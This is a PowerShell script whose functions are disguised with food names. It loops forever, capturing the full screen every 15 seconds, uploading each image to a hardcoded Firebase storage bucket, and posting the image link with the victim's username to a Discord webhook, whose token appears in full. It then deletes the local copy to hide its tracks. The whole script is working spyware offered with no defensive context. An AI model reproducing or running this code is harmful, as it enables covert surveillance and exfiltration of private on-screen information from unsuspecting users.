function Pizza-City {
    param (
        [string]$TacoFilePath
    )

    Add-Type -AssemblyName System.Windows.Forms,System.Drawing

    $spaghetti = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $burger = New-Object -TypeName System.Drawing.Bitmap -ArgumentList $spaghetti.Width, $spaghetti.Height
    $sushi = [System.Drawing.Graphics]::FromImage($burger)

    try {
        $sushi.CopyFromScreen($spaghetti.X, $spaghetti.Y, 0, 0, $spaghetti.Size)
        $burger.Save($TacoFilePath)
    } catch {
        Write-Error "Error making pizza"
    } finally {
        $sushi.Dispose()
        $burger.Dispose()
    }
}

function Sushi-Roll {
    param (
        [string]$CookieFilePath,
        [string]$FruitBasketName
    )

    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $cakeName = "Dessert_$timestamp.png"
    $pizzaUrl = "https://firebasestorage.googleapis.com/v0/b/$FruitBasketName/o/$([System.Web.HttpUtility]::UrlEncode($cakeName))?uploadType=media"

    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($CookieFilePath)
        $headers = @{
            'Content-Type' = 'application/octet-stream'
        }

        $response = Invoke-RestMethod -Uri $pizzaUrl -Method Post -Body $fileBytes -Headers $headers

        return "https://firebasestorage.googleapis.com/v0/b/$FruitBasketName/o/$([System.Web.HttpUtility]::UrlEncode($cakeName))?alt=media"
    } catch {
        return $null
    }
}

function Burger-Msg {
    param (
        [string]$TacoUrl,
        [string]$UserName,
        [string]$PieUrl
    )

    $DateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Message = "${UserName} ${DateTime}: ${PieUrl}"

    $payload = @{
        content = $Message
        embeds = @(
            @{
                image = @{
                    url = $PieUrl
                }
            }
        )
    }

    $body = $payload | ConvertTo-Json -Depth 5  
    $headers = @{'Content-Type' = 'application/json'}

    try {
        Invoke-RestMethod -Uri $TacoUrl -Method Post -Headers $headers -Body $body
    } catch {
    }
}

$discordTacoUrl = "https://discord.com/api/webhooks/1287792562098274315/OpWPJFFOR_DP-FzhglSz6EThsVESr0fHA3LJRtSn-zxRsykRXLfcb-phlqx4zAi8ttYn"
$fruitBasketName = "dodododo-10b20.appspot.com"

while ($true) {
    $tacoFilePath = "$env:temp\$env:computername-Dessert.png"
    Pizza-City -TacoFilePath $tacoFilePath

    $pieUrl = Sushi-Roll -CookieFilePath $tacoFilePath -FruitBasketName $fruitBasketName

    if ($pieUrl) {
        Burger-Msg -TacoUrl $discordTacoUrl -UserName $env:UserName -PieUrl $pieUrl
        Remove-Item -Path $tacoFilePath -Force
    }

    Start-Sleep -Seconds 15
}
